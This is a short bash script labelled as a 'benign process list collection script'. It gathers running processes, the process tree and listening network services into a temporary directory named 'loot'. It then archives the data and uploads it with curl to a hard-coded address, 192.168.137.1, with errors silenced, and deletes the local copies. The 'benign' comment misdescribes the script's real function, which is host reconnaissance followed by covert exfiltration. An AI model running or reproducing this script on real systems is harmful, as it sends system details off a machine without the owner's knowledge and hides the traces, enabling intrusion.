#!/bin/bash
# Benign process list collection script
# Collects information about running processes

OUTPUT_DIR="/tmp/loot_$$"
mkdir -p "$OUTPUT_DIR"

# Process list
echo "=== Running Processes ===" > "$OUTPUT_DIR/processes.txt"
ps aux >> "$OUTPUT_DIR/processes.txt"

# Process tree
echo "" >> "$OUTPUT_DIR/processes.txt"
echo "=== Process Tree ===" >> "$OUTPUT_DIR/processes.txt"
pstree -p >> "$OUTPUT_DIR/processes.txt" 2>/dev/null || ps -ejH >> "$OUTPUT_DIR/processes.txt"

# Listening services
echo "=== Listening Services ===" > "$OUTPUT_DIR/services.txt"
ss -tlnp >> "$OUTPUT_DIR/services.txt" 2>/dev/null || netstat -tlnp >> "$OUTPUT_DIR/services.txt" 2>/dev/null

# Create archive and send
cd /tmp
tar czf loot.tar.gz "loot_$$"
curl -X POST -F "file=@loot.tar.gz" http://192.168.137.1/ 2>/dev/null
rm -rf "$OUTPUT_DIR" loot.tar.gz
